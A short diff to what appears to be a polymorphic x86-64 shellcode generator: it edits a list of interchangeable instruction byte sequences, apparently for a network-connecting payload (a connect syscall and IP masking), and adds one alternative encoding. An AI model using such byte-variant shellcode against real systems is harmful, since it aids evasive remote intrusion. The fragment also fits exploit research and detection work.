@@ -14,7 +14,7 @@ linux_x64 = [
     [r"\x0f\x05"],     # SYSCALL
     [r"\x48\x97"],     # XCHG RAX, RDI
     [r"\x48\x31\xc0", r"\x48\x29\xc0", r"\x48\x89\xc0\x48\x31\xc0", r"\x48\x83\xe0\xff"], # XOR RAX
-    [r"\xb0\x2a"],     # mov AL, 0x2a
+    [r"\xb0\x2a"],     # mov al, 0x2a
     [r"\x52"],         # PUSH RDX
     [r"\x41\xb9"], # MOV R9, IP
     [r"\x49\x81\xe1"], # AND R9, MASK
@@ -26,7 +26,7 @@ linux_x64 = [
     [r"\x80\xc2\x0e", r"\x80\xc2\x0d\xfe\xc2", r"\x80\xc2\x0f\x80\xea\x01"], # ADD DL, 0xe
     [r"\x48\x89\xe6"], # MOV RSP, RSI
     [r"\x0f\x05"],     # SYSCALL
-    [r"\x48\x31\xf6"], # XOR RSI
+    [r"\x48\x31\xf6", r"\x48\x29\xf6"], # XOR RSI
     [r"\x31\xd2", r"\x29\xd2"],     # XOR EDX, EDX
     [r"\x80\xc2\x03"], # ADD DL, 0x3
     [""],
